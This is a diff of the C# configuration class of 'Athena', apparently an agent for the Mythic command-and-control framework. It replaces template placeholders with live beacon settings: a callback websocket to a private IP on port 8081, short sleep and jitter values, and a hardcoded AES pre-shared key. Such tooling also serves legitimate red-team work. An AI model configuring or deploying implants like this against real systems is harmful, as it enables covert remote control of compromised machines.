@@ -20,12 +20,12 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "%UUID%";
+            this.uuid = "ccec4b0c-7940-4569-9368-d085cd10ca0e";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("5", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.forwarder = new Forwarder();
@@ -50,14 +50,14 @@ namespace Athena.Config
 
         public Websocket(string uuid)
         {
-            int callbackPort = Int32.Parse("callback_port");
-            string callbackHost = "callback_host";
-            this.endpoint = "ENDPOINT_REPLACE";
+            int callbackPort = Int32.Parse("8081");
+            string callbackHost = "ws://192.168.4.201";
+            this.endpoint = "socket";
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "AESPSK";
-            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.psk = "q7cdNd9WW0kFJoyokHcgSJFkg0PKdO8DxQOLoUjitT0=";
+            this.encryptedExchangeCheck = bool.Parse("false");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
